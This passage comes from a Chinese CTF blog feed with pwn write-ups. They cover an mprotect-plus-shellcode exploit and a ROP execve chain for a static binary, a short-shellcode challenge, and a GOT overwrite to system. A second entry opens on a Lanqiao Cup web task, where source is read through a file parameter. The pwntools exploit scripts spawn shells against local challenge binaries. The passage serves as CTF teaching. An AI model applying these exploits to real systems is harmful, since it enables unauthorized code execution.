text"><br>存在gets函数栈溢出漏洞，且程序中不存在system函数及<code>/bin/sh</code>字符串<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7b77c193-732e-4c99-a1c5-bac4b996688c.png" alt="alt text"><br>确定偏移为0xD0<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a32392af-f7b4-43bb-88ee-dc6db0ef98f6.png" alt="alt text"><br>静态编译的pwn题，参考该大佬的文章：<br><a href="https://blog.csdn.net/yjh_fnu_ltn/article/details/140216927">[pwn]静态编译</a><br><a href="https://www.cnblogs.com/CH13hh/p/18110333">mprotect静态编译</a><br>在遇到静态编译的题目时，我们不能同过泄露libc的方式来攻击，只能寻找是否存在system函数或者存在<code>mprotect</code>函数。该函数的作用是，可以修改一段内存的权限。<br><strong>mprotect</strong>：<br><a href="https://www.qnx.com/developers/docs/8.0/com.qnx.doc.neutrino.lib_ref/topic/m/mprotect.html">mprotect()</a><br>在linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。<br>函数原型如下：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/367eb627-8c1f-4bd1-a1a4-903e816275e3.png" alt="alt text"></p><p>mprotect()函数把自start开始的，长度为len的内存去的保护属性修改为prot指定的值。<br>port可以取以下几个值，并且可以用’|'将几个属性合起来使用（在<code>sys/mman.h</code>中定义）：</p><ol><li>PORT_READ: 表示内存段内的内容可读；</li><li>PROT_WRITE: 表示内存段内的内存可写；</li><li>PORT_EXEC: 表示内存段中的内容可执行，要成功使用改标志，进程必需启用<code>PROCMGR_AID_PROT_WRITE_AND_EXEC</code>权限。；</li><li>PROT_NONE: 表示内存段中的内存不可被访问(不可读、不可写、不可执行)；</li><li>PROT_NOCACHE: 禁用该区域的缓存（例如用于访问双端口内存），在ARM架构上，<code>PROT_NOCACHE</code>会使RAM被映射为<code>正常非缓存</code>类型，但非RAM区域则会映射为“强序设备内存”。；</li></ol><p>需要指出的是：锁指定的内存区间必需包含整个内存页(4K)。区间开始的地址start必需是一个内存页的起始地址，并且区间len必须是页大小的整数倍。<br>如果执行成功，则返回0(success)；如果执行失败，则返回-1(发生了错误，设置errno)，说明具体因为什么原因造成调用失败。错误原因主要有以下几个：</p><ol><li>EACCES:<ul><li>内存对象未以读取方式打开，即使指定了读保护</li><li>内存对象未以写入方式打开，但你为<code>MAP_SHARED</code>类型指定了<code>PROT_WRITE</code></li><li>你为一个内存映射文件指定了<code>PROT_EXEC</code>，但该文件对客户端进程没有执行权限，并且<code>procnto</code>是使用<code>-mx</code>选项启动的。</li></ul></li><li>EINAIN: <code>prot</code>参数为<code>MAP_PRIVATE</code>映射指定了<code>PROT_WRITE</code>，但系统资源不足，无法为锁定私有页预留内存。</li><li>ENOMEM：<ul><li>从<code>addr</code>开始的地址范围(长度为<code>len</code>字节)超出了进程地址空间允许的范围，或者包含一个或多个未映射的页面；</li><li><code>prot</code>参数为<code>MAP_PRIVATE</code>映射指定了<code>PROT_WRITE</code>，而锁定这些私有页（如果需要）需要的空间超出系统能提供的预留容量；</li><li>系统可用内存不足，无法将<code>PROT_NONE</code>映射转换为<code>PROT_READ</code>和/或<code>PROT_WRITE</code></li></ul></li><li>ENOSYS： 当前实现不支持<code>mprotect()</code>函数。</li><li>EPERM:<ul><li>调用进程没有所需权限（见<code>procmgr_ability</code>）</li><li>或者试图为受不信任内存映射文件覆盖的区域设置<code>PROT_EXEC</code>。</li></ul></li></ol><p>我们查找是否存在<code>mprotect()</code>函数。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/2fdd4f1c-4fb6-423f-b1d2-ab75687eaa7e.png" alt="alt text"><br>然后，寻找可以修改权限的内存页，来实现写入payload。使用gdb进行调试寻找。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/431c9365-b3a3-4197-a01e-15e29251a2c9.png" alt="alt text"><br>从下往上看汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">add     esp, 10h  </span><br><span class="line">sub     esp, 0Ch  </span><br><span class="line">lea     eax, (aCouldYouTellMe - 80EE000h)[ebx] ; <span class="string">&quot;could you tell me your name?&quot;</span>  </span><br><span class="line">push    eax  </span><br><span class="line">call    puts  </span><br><span class="line">add     esp, 10h  </span><br><span class="line">sub     esp, <span class="number">4</span>  </span><br><span class="line">push    100h  </span><br><span class="line">lea     eax, (name - 80EE000h)[ebx]  </span><br><span class="line">push    eax  </span><br><span class="line">push    <span class="number">0</span>  </span><br><span class="line">call    read  </span><br><span class="line">add     esp, 10h  </span><br><span class="line">sub     esp, 0Ch  </span><br><span class="line">lea     eax, (aIHeardYouLoveG - 80EE000h)[ebx] ; <span class="string">&quot;i heard you love gets,right?&quot;</span>  </span><br><span class="line">push    eax  </span><br><span class="line">call    puts  </span><br><span class="line">add     esp, 10h  </span><br><span class="line">sub     esp, 0Ch  </span><br><span class="line">lea     eax, [ebp+buf]  </span><br><span class="line">push    eax  </span><br><span class="line">call    gets  </span><br><span class="line">add     esp, 10h  </span><br><span class="line">mov     eax, <span class="number">0</span>  </span><br><span class="line">lea     esp, [ebp-<span class="number">8</span>]  </span><br><span class="line">pop     ecx  </span><br><span class="line">pop     ebx  </span><br><span class="line">pop     ebp  </span><br><span class="line">lea     esp, [ecx-<span class="number">4</span>]  </span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>最后retn的值是<code>ecx-4</code>，而<code>ecx</code>寄存器的值保存在<code>ebp-8</code>，buf距离ebp<code>0xD0</code>。这里我们先将要执行的<code>mprotect</code>对name所在内存页赋予可读可写可执行的权限与shellcode写入name中，最后，利用gets溢出跳转到name的地址，此时便会先执行<code>mprotect</code>授权，然后执行shellcode拿到权限。<br>再细说下流程：<br>首先，name所在的.bss段是可以写入的，并且可写入字节数足够大，但不可以执行，所以，我们首先构造使用<code>mprotect</code>对name所在.bss段的内存页进行提权的代码段，再跟上我们要使用shellcode。将这一段代码先写入name所在的.bss段中去。然后，到gets函数时，覆盖到<code>ebp-8</code>的位置，也就是ecx的地址，则<code>ecx-4</code>的地址即为name的地址，返回到name地址后，第一步便会执行mprotect进行提权，然后执行shellcode。<br>这里贴出chat给出的解释</p><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/6719ad91-656c-4627-b113-11653e9fe352.png" alt="alt text"><br>写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack  </span><br><span class="line">  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line"><span class="comment"># sh = remote(&quot;&quot;, )  </span></span><br><span class="line">  </span><br><span class="line">mprotect_addr = <span class="number">0x08070A70</span>  </span><br><span class="line">name = <span class="number">0x080EF320</span>  </span><br><span class="line">  </span><br><span class="line">payload = p32(mprotect_addr) + p32(name + <span class="number">0x14</span>) + p32(<span class="number">0x080EF000</span>) + p32(<span class="number">0x1000</span>) + p32(<span class="number">0x07</span>) + asm(shellcraft.sh())  </span><br><span class="line">sh.recvuntil(<span class="string">b&quot;could you tell me your name?\n&quot;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xD0</span> - <span class="number">0x08</span>) + p32(name + <span class="number">0x04</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">b&quot;i heard you love gets,right?\n&quot;</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/3cb1e5aa-eafd-4881-8fb2-ea20f0576390.png" alt="alt text"><br>还有一种方式利用<code>ret2syscall</code>，写好rop链后使用栈迁移到该地址继续执行即可。<br>使用ROPgadget来搜索指令片段，构成<code>call system('/bin/sh')</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./pwn --ropchain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/85e0a448-e6d0-4498-adbc-6ff99825f1fc.png" alt="alt text"><br>然后利用栈迁移，跟exp1的构造方法差不多，都是迁移到name段开始执行代码。<br>exp2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack  </span><br><span class="line">  </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  </span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">name = <span class="number">0x080EF320</span>  </span><br><span class="line"><span class="comment"># Padding goes here  </span></span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) <span class="comment"># pop edx ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee060</span>) <span class="comment"># @ .data  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b470a</span>) <span class="comment"># pop eax ; ret  </span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span>  </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) <span class="comment"># mov dword ptr [edx], eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) <span class="comment"># pop edx ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee064</span>) <span class="comment"># @ .data + 4  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b470a</span>) <span class="comment"># pop eax ; ret  </span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span>  </span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) <span class="comment"># mov dword ptr [edx], eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) <span class="comment"># pop edx ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) <span class="comment"># @ .data + 8  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080507e0</span>) <span class="comment"># xor eax, eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) <span class="comment"># mov dword ptr [edx], eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049022</span>) <span class="comment"># pop ebx ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee060</span>) <span class="comment"># @ .data  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049802</span>) <span class="comment"># pop ecx ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) <span class="comment"># @ .data + 8  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) <span class="comment"># pop edx ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) <span class="comment"># @ .data + 8  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080507e0</span>) <span class="comment"># xor eax, eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049c6a</span>) <span class="comment"># int 0x80  </span></span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">b&quot;could you tell me your name?\n&quot;</span>)  </span><br><span class="line">sh.sendline(p)  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xD0</span> - <span class="number">0x08</span>) + p32(name + <span class="number">0x04</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1edbc7fc-ac9c-481c-962b-147c37a085a2.png" alt="alt text"></p><h1>TGCTF-shellcode</h1><p>反正我是够用了，仔细看看寄存器吧</p><p>checksec查保护，运行随手输入发现存在输入限制，开启了PIE保护以及NX保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b4dbd0f2-95fe-4446-963c-32c4e8d21324.png" alt="alt text"><br>使用IDA反编译查看：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/225c05b6-e3d3-4a3a-9206-4ba0275a889a.png" alt="alt text"></p><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4cb3e2b6-82b4-4f7e-add4-aafd59f0479e.png" alt="alt text"><br>看不懂，问完chat后，明白了代码执行逻辑。先看一下mmap函数：<br><a href="https://blog.csdn.net/qq_73089613/article/details/147332608?sharetype=blogdetail&amp;sharerId=147332608&amp;sharerefer=PC&amp;sharesource=qq_73089613&amp;spm=1011.2480.3001.8118">C语言–mmap()函数</a><br>然后让我们来看程序实现逻辑：<br>首先关闭标准输入输出及错误输出的缓冲，确保输入输出实时刷新，便于交互，然后输出提示语。接下来，使用<code>mmap</code>函数分配了一段大小为<code>0x1000</code>字节的内存，刚好为一页内存，设置这页内存的权限为可读可写可执行，设置这段内存是匿名映射且不共享。完成后返回地址保存在buf中。然后，调用<code>read</code>函数读取<code>0x12</code>字节保存到<code>buf</code>中。接下来使用<code>mprotect()</code>将<code>buf</code>所在内存页（也就是上述使用<code>mmap()</code>函数修改为可读可写可执行权限的内存页）修改为只读权限。接下来，跳转到<code>buf</code>段中开始执行代码。</p><p>利用方法就很明了了，由于该题关闭了二次读入，所以我们需要使用<code>read</code>函数读入<code>0x12</code>字节的shellcode即可。<br>使用gdb调试一下：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/9adcceb9-3cff-4e56-9ebb-f009598dce4c.png" alt="alt text"><br>可以发现，传入的数值仅在<code>RDI</code>寄存器中，所以我们可以利用<code>add al, 0x3b</code>，使<code>rax = 0x3b</code>，即<code>execve</code>的<code>syscall</code>编号，接下来使用<code>add rdi, 0x8</code>，修改<code>rdi</code>寄存器的值偏移<code>0x08</code>字节，接下来使用<code>syscall</code>发起系统调用，实际上是调用了<code>execve</code>，接下来，再发送<code>/bin/sh\x00</code>，构成<code>execve('/bin/sh')</code>，拿到shell。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)  </span><br><span class="line"><span class="comment"># sh = remote(&quot;&quot;, )  </span></span><br><span class="line">  </span><br><span class="line">sh.recvuntil(<span class="string">b&quot;try to show your strength \n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">payload = asm(<span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">        add al, 0x3b  </span></span><br><span class="line"><span class="string">        add rdi, 0x8  </span></span><br><span class="line"><span class="string">        syscall  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)  </span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>  </span><br><span class="line">gdb.attach(sh)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>没打通，哈哈，看到其他大佬的exp应该是打通了的，没想通是什么原因，有大佬可以告诉我嘛。调试出的报错是因为没有给予execve后面两个参数。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/70846c3b-1c02-41be-b6a6-c96ea194964a.png" alt="alt text"></p><h1>TGCTF-stack</h1><p>模拟了，但没完全模拟<br>checksec+运行，得到基本信息，仅开启NX保护，并且存在两次输入。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b0520016-6e9b-43ee-b7cb-0cc5cfd24867.png" alt="alt text"><br>IDA反编译进行查看。</p><h1>NX_on</h1><p>NX保护开启，你该怎么办？<br>checksec查保护，64位程序，开启了NX保护与canary保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/941bf5ed-0a45-419c-be90-96613bc7afe2.png" alt="alt text"><br>使用ida反编译。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d7b78ff5-4c44-496f-aec9-bff7303fecd6.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a6ceb61d-aa38-46d4-9922-a5f75dcca50a.png" alt="alt text"><br>静态编译程序。</p><h1>这是什么？GOT！</h1><p>现代 Linux 可执行文件基本都是动态链接的 ELF 格式文件。大多数程序运行时都需要使用外部库函数（libc！），动态连接器 ld 架起了程序与动态链接库之间的桥梁。程序内部的 GOT（全局偏移表）负责记录这些库函数真正的地址或用于调用动态链接器的 PLT（过程链接表）项地址（首次调用前）。动态链接程序运行时不直接调用库函数，而是调用 PLT 项。在未完全开启 RELRO（重定向只读）保护时，我们可以在运行时修改 GOT！<br>checksec查保护，64位程序，开启NX保护<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/89d34e8a-d540-43d8-b094-8cfdc673666b.png" alt="alt text"><br>ida反编译<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/839c444e-f213-4b21-a709-f73c5d8c3efb.png" alt="alt text"><br>可利用的点在<code>read</code>函数处，<code>off_404000</code>指向的是<code>puts@got</code>地址处，意思是可以向<code>puts@got</code>及以后的地址写入最多64字节的数据，也就是我们可以直接覆盖掉<code>puts@got</code>及以后的数据，来控制程序执行流。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.update(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])  </span><br><span class="line">  </span><br><span class="line">sh = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">34429</span>)  </span><br><span class="line"><span class="comment"># sh = process(&quot;./pregot&quot;)  </span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pregot&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">system_plt = <span class="number">0x0401056</span>  </span><br><span class="line">unreachable = <span class="number">0x0401196</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(system_plt) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x20</span> + p64(unreachable)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1>这是什么？libc</h1><p>不好，PIE（位置无关程序）保护开启后，程序本身运行时加载到内存里的位置再也无法预测。隔壁 libc 也因为 ASLR（地址空间布局随机化）而难以利用。<br>诶🤓，如果，我是说如果我们能拿到一个 libc 中的地址，那么整个 libc 就尽在掌握了。ASLR 不会改变程序内部符号间偏移量。</p>]]></content>
    
    
    <summary type="html">刷刷西电平台的题目，pwn！！</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>2025蓝桥杯网安-wp</title>
    <link href="https://www.xvzhang.fun/posts/e81082a.html"/>
    <id>https://www.xvzhang.fun/posts/e81082a.html</id>
    <published>2025-05-07T02:46:22.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>情报收集</h1><p>访问<code>file?name=app.py</code>，拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template  </span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *  </span><br><span class="line"><span class="comment"># author: gamelab  </span></span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 模拟敏感信息  </span></span><br><span class="line">sensitive_info = SENSITIVE_INFO  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 加密密钥  </span></span><br><span class="line">encryption_key = ENCRYPTION_KEY  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_encrypt</span>(<span class="params">text, key</span>):  </span><br><span class="line">    encrypted = <span class="built_in">bytearray</span>()  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):  </span><br><span class="line">        char = text[i]  </span><br><span class="line">        key_char = key[i % <span class="built_in">len</span>(key)]  </span><br><span class="line">        encrypted.append(<span class="built_in">ord</span>(char) + <span class="built_in">ord</span>(key_char))  </span><br><span class="line">    <span class="keyword">return</span> encrypted.<span class="built_in">hex</span>()  </span><br><span class="line">  </span><br><span class="line">encrypted_sensitive_info = simple_encrypt(sensitive_info, encryption_key)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 模拟日志文件内容  </span></span><br><span class="line">log_content = <span class="string">f&quot;用户访问了 /secret 页面，可能试图获取 <span class="subst">&#123;encrypted_sensitive_info&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 